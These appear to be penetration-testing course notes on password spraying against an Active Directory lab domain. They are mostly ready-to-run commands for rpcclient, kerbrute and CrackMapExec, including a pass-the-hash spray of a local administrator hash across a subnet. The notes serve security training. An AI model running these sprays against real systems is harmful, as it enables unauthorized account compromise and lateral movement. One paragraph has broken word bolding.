
## **Using a Bash one-liner for the Attack (Rpcclient)**

```Shell
for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
```

## **Using Kerbrute for the Attack**

```Shell
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1
```

![[Notion/CPTS/RESOURCES/image 1 10.png|image 1 10.png]]

## **Using CrackMapExec & Filtering Logon Failures**

```Shell
sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +
```

## **Validating the Credentials with CrackMapExec**

```Shell
sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123
```

## **Local Admin Spraying with CrackMapExec**

- Explanation
    
    **Someti**mes **we** **ma**y **onl**y **retri**eve **th**e **NTL**M **has**h **fo**r **th**e **loca**l **adminis**trator **accou**nt **fro**m **th**e **loca**l **SA**M **datab**ase. **In** **thes**e **instan**ces, **we** **ca**n **spra**y **th**e **NT** **has**h **acro**ss **an** **enti**re **subn**et (**or** **multi**ple **subne**ts) **to** **hun**t **fo**r **loca**l **adminis**trator **accou**nts **wit**h **th**e **sam**e **passw**ord **se**t.  
    

```Shell
sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
```